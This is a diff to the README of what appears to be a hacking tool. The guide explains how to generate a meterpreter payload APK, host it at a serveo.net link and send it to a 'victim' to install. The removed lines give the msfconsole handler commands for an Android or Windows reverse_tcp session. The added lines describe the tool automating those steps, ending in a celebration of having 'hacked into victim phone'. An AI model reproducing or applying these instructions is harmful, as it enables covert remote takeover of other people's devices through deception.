@@ -12,7 +12,7 @@ Here is a quick guide how to use it:
     Once selecting the Web Payload your payload will be directly transfered
     to a website called :
     # https://payload.serveo.net/(Your payload name).apk
-    Send this link to victim and he will download the payloa
+    Send this link to victim and he will download the payload
 
     Once you selected the Simple Payload a payload will be created in your
     device internal storage and you can send this payload to victim device
@@ -20,23 +20,15 @@ Here is a quick guide how to use it:
 
 [2] Run your hack terminal by commanding :(If using web payload)
     # bash Msfconsole-attack.sh
-    Once you have done this make sure that this commands should be typed before
-    your victim install and run the payload :
-    # msf5> set exploit/multi/handler
-    # msf5> set payload android/meterpreter/reverse_tcp
-            (If you have selected android platform)
-                 OR
-    # msf5> set payload windows/meterpreter/reverse_tcp
-            (If you have selected windows platform)
-    # msf5> set lhost localhost
-    # msf5> set lport (your serveo port)
-    # msf5> exploit
-    After this if your payload is installed and runned in victim device
-    so you can see something like this on screen :
-    # meterpreter>
-    BINGO!! you have sucessfully exploited your victim device
-    This process in simple payload is automated!!!!!!!!!!
-    
+    Once you have entered the command then amke sure you follow all the 
+    steps over here before the payload is installed in the victim device
+    Firstly selected the platform and then enter your serveo port
+    The the rest process is automated no worry
+    Then intsall the payload in victim and you will see something 
+    like this on your terminal::
+    meterpreter >
+    If so..
+    Bingo!! You have sucessfully hacked into victim phone 
     Check out the commands.txt to perform operation in victim device
 
 [3] Now once you are in the system what if u want to access the victim
